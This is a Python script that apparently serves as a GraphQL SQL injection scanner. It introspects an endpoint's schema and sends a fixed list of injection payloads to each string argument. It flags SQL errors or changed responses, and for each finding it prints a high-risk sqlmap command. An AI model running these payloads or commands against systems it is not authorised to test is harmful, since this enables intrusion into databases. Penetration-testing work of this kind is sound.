#!/usr/bin/env python3
"""
sqli_detector.py
GraphQL SQL injection mini-detector (Python).

Behavior:
 - For each finding the script creates ONLY a marker file in repro-payloads/
   where the detected vulnerable value is replaced by '*' inside the GraphQL query string.
 - The script prints only the recommended sqlmap command for the marker file
   (uses -r and targets JSON[query] with --skip-urlencode and --parse-errors).
 - It does NOT write files that contain the original payloads that may break GraphQL parsing.

Usage:
    python graphql-sqli-detector/sqli_detector.py <ENDPOINT_URL> '<HEADERS_JSON>'

Example:
    python graphql-sqli-detector/sqli_detector.py http://localhost:4000/graphql '{"Authorization":"Bearer TOKEN"}'
"""
from __future__ import annotations
import os
import re
import json
import hashlib
import argparse
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse
from pathlib import Path

import requests
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except Exception:
    class _Dummy:
        def __getattr__(self, name): return ""
    Fore = Style = _Dummy()

INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    types {
      kind
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
        type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
"""

PAYLOADS = [
    '" OR "1"="1',
    "' OR '1'='1",
    "admin' -- ",
    "x' UNION SELECT NULL-- ",
    '"\' OR 1=1 -- ',
    "'",
    "admin'/*",
    'admin"/*',
]

SQL_ERROR_SIGS = [
    re.compile(r"SQL syntax", re.I),
    re.compile(r"syntax error", re.I),
    re.compile(r"unterminated quoted string", re.I),
    re.compile(r"mysql", re.I),
    re.compile(r"postgres", re.I),
    re.compile(r"sqlite", re.I),
    re.compile(r"sqlstate", re.I),
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"pg_query\(", re.I),
]

TIMEOUT = 20  # seconds
REPRO_DIR = "repro-payloads"
TRUNCATE_LEN_DEFAULT = 120


def try_parse_headers(h: Optional[str]) -> Dict[str, str]:
    if not h:
        return {}
    try:
        parsed = json.loads(h)
        if isinstance(parsed, dict):
            return parsed
        if isinstance(parsed, list):
            res = {}
            for item in parsed:
                if isinstance(item, dict):
                    res.update(item)
            return res
        print(Fore.YELLOW + "[!] Headers JSON is not an object/dict; trying simple parse.")
    except Exception:
        pass
    headers = {}
    for part in re.split(r";|,", h):
        part = part.strip()
        if not part:
            continue
        if ":" in part:
            k, v = part.split(":", 1)
            headers[k.strip()] = v.strip()
    if headers:
        return headers
    print(Fore.YELLOW + "[!] Failed to parse headers; no additional headers will be used.")
    return {}


def post_graphql(endpoint: str, headers: Dict[str, str], payload: Dict[str, Any]) -> Dict[str, Any]:
    h = {"Content-Type": "application/json"}
    h.update(headers)
    try:
        r = requests.post(endpoint, json=payload, headers=h, timeout=TIMEOUT)
        try:
            data = r.json()
        except Exception:
            data = {"_raw_text": r.text}
        return {"status": r.status_code, "data": data}
    except requests.RequestException as e:
        return {"status": 0, "data": {"errors": [{"message": str(e)}]}}


def extract_named_type(t: Optional[Dict[str, Any]]) -> Optional[str]:
    if not t:
        return None
    if t.get("name"):
        return t.get("name")
    if t.get("ofType"):
        return extract_named_type(t.get("ofType"))
    return None


def is_string_type(arg_type_name: Optional[str]) -> bool:
    if not arg_type_name:
        return False
    n = arg_type_name.lower()
    return n in ("string", "id", "varchar", "text")


def find_type_definition(schema_types: List[Dict[str, Any]], name: Optional[str]) -> Optional[Dict[str, Any]]:
    if not name:
        return None
    for t in schema_types:
        if t.get("name") == name:
            return t
    return None


def pick_scalar_field_for_type(type_def: Optional[Dict[str, Any]], schema_types: List[Dict[str, Any]]) -> Optional[str]:
    if not type_def or not type_def.get("fields"):
        return None
    for f in type_def.get("fields", []):
        tname = extract_named_type(f.get("type"))
        if not tname:
            continue
        low = tname.lower()
        if low in ("string", "int", "float", "boolean", "id", "integer"):
            return f.get("name")
        td = find_type_definition(schema_types, tname)
        if not td or not td.get("fields"):
            return f.get("name")
    return None


def check_sql_error_in_response(resp_data: Dict[str, Any]) -> Optional[Dict[str, str]]:
    if not resp_data:
        return None
    errors = resp_data.get("errors")
    if not errors:
        return None
    for e in errors:
        msg = str(e.get("message", ""))
        for rx in SQL_ERROR_SIGS:
            if rx.search(msg):
                return {"evidence": msg, "pattern": rx.pattern}
    return None


def normalize_resp(data: Any) -> str:
    try:
        return json.dumps(data, sort_keys=True, ensure_ascii=False)
    except Exception:
        return str(data)


def truncate_str(s: str, n: int = 180) -> str:
    if not s:
        return ""
    return s if len(s) <= n else s[:n] + "..."


def build_query(field_name: str, arg_name: str, payload_value: str, selection: Optional[str]) -> Dict[str, Any]:
    value_literal = json.dumps(payload_value)
    if selection:
        q = f'query {{ {field_name}({arg_name}: {value_literal}) {{ {selection} }} }}'
    else:
        q = f'query {{ {field_name}({arg_name}: {value_literal}) }}'
    return {"query": q}


def _sanitize_name(s: str) -> str:
    return re.sub(r"[^\w\-]+", "_", s)[:64]


def _write_raw_http(endpoint: str, headers: Dict[str, str], body_json: Dict[str, Any], fname: str) -> str:
    repo_root = Path.cwd()
    repro_dir = repo_root / REPRO_DIR
    repro_dir.mkdir(parents=True, exist_ok=True)
    parsed = urlparse(endpoint)
    path = parsed.path or "/"
    if parsed.query:
        path = path + "?" + parsed.query
    host_header = parsed.netloc
    hdrs = {}
    hdrs["Host"] = host_header
    for k, v in (headers or {}).items():
        if k.lower() == "host":
            hdrs["Host"] = v
        else:
            hdrs[k] = v
    if not any(k.lower() == "content-type" for k in hdrs):
        hdrs["Content-Type"] = "application/json"
    body_str = json.dumps(body_json, ensure_ascii=False)
    fpath = repro_dir / fname
    lines = []
    lines.append(f"POST {path} HTTP/1.1")
    for k, v in hdrs.items():
        lines.append(f"{k}: {v}")
    lines.append("")  # blank line
    lines.append(body_str)
    content = "\r\n".join(lines) + "\r\n"
    with open(fpath, "w", encoding="utf-8") as fh:
        fh.write(content)
    return str(fpath)


def write_repro_request_file_with_marker(endpoint: str, headers: Dict[str, str], attack_query: str, field: str, arg: str, payload: str) -> str:
    """
    Write only a marker .http file in which the first occurrence of the detected
    payload is replaced by '*' inside the GraphQL query string.
    Returns the absolute path to the written marker file.
    """
    marker_query = attack_query.replace(payload, "*", 1)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    short_hash = hashlib.sha1(marker_query.encode("utf-8")).hexdigest()[:8]
    fname = f"{_sanitize_name(field)}_{_sanitize_name(arg)}_{ts}_{short_hash}_marker.http"
    body = {"query": marker_query}
    return _write_raw_http(endpoint, headers, body, fname)


def _build_sqlmap_cmd_marker(repro_marker_path: str) -> str:
    # target JSON[query] on marker file, skip urlencode and parse errors
    return f"sqlmap --level 5 --risk 3 -r '{repro_marker_path}' -p \"JSON[query]\" --batch --skip-urlencode --parse-errors --random-agent"


def run_detector(endpoint: str, headers: Dict[str, str]) -> List[Dict[str, Any]]:
    print(f"[*] Running introspection on {endpoint}")
    intros = post_graphql(endpoint, headers, {"query": INTROSPECTION_QUERY})
    schema = None
    try:
        schema = intros["data"]["data"]["__schema"]
    except Exception:
        print(Fore.RED + "[!] Failed to retrieve schema via introspection. Response:")
        print(json.dumps(intros.get("data", {}), ensure_ascii=False, indent=2))
        return []

    types = schema.get("types", [])
    query_type = next((t for t in types if t.get("name") == "Query"), None)
    if not query_type or not query_type.get("fields"):
        print(Fore.RED + "[!] Query type or fields not found in schema.")
        return []

    findings: List[Dict[str, Any]] = []

    for field in query_type.get("fields", []):
        args = field.get("args", []) or []
        if not args:
            continue
        for arg in args:
            arg_type_name = extract_named_type(arg.get("type"))
            if not is_string_type(arg_type_name):
                continue

            return_type_name = extract_named_type(field.get("type"))
            return_type_def = find_type_definition(types, return_type_name)
            selection = pick_scalar_field_for_type(return_type_def, types)
            if not selection and return_type_def and return_type_def.get("fields"):
                fallback = next((f for f in return_type_def["fields"] if f["name"] in ("id", "uuid", "username", "name", "title")), None)
                if fallback:
                    selection = fallback["name"]

            benign = "testuser"
            base_payload = build_query(field["name"], arg["name"], benign, selection)
            base_resp = post_graphql(endpoint, headers, base_payload)
            base_norm = normalize_resp(base_resp.get("data"))

            for payload in PAYLOADS:
                attack_payload = build_query(field["name"], arg["name"], payload, selection)
                attack_resp = post_graphql(endpoint, headers, attack_payload)

                sql_err = check_sql_error_in_response(attack_resp.get("data"))
                attack_query = attack_payload["query"]

                if sql_err:
                    # create only marker file and recommend marker-based command
                    repro_marker = write_repro_request_file_with_marker(endpoint, headers, attack_query, field["name"], arg["name"], payload)
                    recommended_cmd = _build_sqlmap_cmd_marker(repro_marker)
                    findings.append({
                        "field": field["name"],
                        "arg": arg["name"],
                        "payload": payload,
                        "type": "SQL_ERROR_IN_RESPONSE",
                        "evidence": sql_err["evidence"],
                        "base_response": base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": recommended_cmd,
                    })
                    continue

                attack_norm = normalize_resp(attack_resp.get("data"))
                if base_norm and attack_norm and base_norm != attack_norm:
                    repro_marker = write_repro_request_file_with_marker(endpoint, headers, attack_query, field["name"], arg["name"], payload)
                    recommended_cmd = _build_sqlmap_cmd_marker(repro_marker)
                    findings.append({
                        "field": field["name"],
                        "arg": arg["name"],
                        "payload": payload,
                        "type": "RESPONSE_DIFF",
                        "evidence": f"Baseline != Attack (baseline {truncate_str(base_norm, 150)}, attack {truncate_str(attack_norm, 150)})",
                        "base_response": base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": recommended_cmd,
                    })
                    continue

                if base_norm and attack_norm and ("null" in attack_norm) and ("null" not in base_norm):
                    repro_marker = write_repro_request_file_with_marker(endpoint, headers, attack_query, field["name"], arg["name"], payload)
                    recommended_cmd = _build_sqlmap_cmd_marker(repro_marker)
                    findings.append({
                        "field": field["name"],
                        "arg": arg["name"],
                        "payload": payload,
                        "type": "NULL_ON_ATTACK",
                        "evidence": "Null returned on attack while baseline had data",
                        "base_response": base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": recommended_cmd,
                    })
                    continue

    return findings


def print_findings_short(findings: List[Dict[str, Any]], truncate_len: int):
    if not findings:
        print(Fore.GREEN + "[*] No obvious SQLi indications were found using the basic payloads.")
        return
    for f in findings:
        print(Fore.RED + Style.BRIGHT + "VULNERABLE PARAMETER:" + Style.RESET_ALL + f" {f.get('arg')} (field: {f.get('field')})")
        print(Fore.YELLOW + "Evidence:" + Style.RESET_ALL + f" {truncate_str(str(f.get('evidence', '')), truncate_len)}")
        print(Fore.CYAN + "Recommended sqlmap command:" + Style.RESET_ALL)
        print(Fore.WHITE + Style.DIM + f"{f.get('recommended_cmd')}")
        print(Style.DIM + "-" * 80 + Style.RESET_ALL)


def main():
    parser = argparse.ArgumentParser(description="GraphQL SQLi mini-detector (writes marker .http files and prints recommended sqlmap commands)")
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("headers", nargs="?", help="Optional headers JSON, e.g. '{\"Authorization\":\"Bearer TOKEN\"}'", default=None)
    args = parser.parse_args()

    headers = try_parse_headers(args.headers)
    findings = run_detector(args.endpoint, headers)
    print_findings_short(findings, TRUNCATE_LEN_DEFAULT)


if __name__ == "__main__":
    main()
